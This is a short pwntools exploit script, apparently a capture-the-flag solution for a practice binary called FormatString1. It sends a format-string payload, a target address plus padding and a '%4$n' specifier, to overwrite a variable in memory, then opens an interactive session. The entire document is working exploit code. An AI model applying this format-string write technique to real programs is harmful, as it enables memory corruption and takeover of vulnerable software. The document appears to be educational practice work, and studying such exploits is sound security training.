from pwn import *

r = process('../FormatString1/share/FormatString1')
num_addr = 0x0804c028
payload = p32(num_addr) + b'aaaaaaaaaaaaaaaa%4$n'
r.sendlineafter(b'!', payload)
r.interactive()
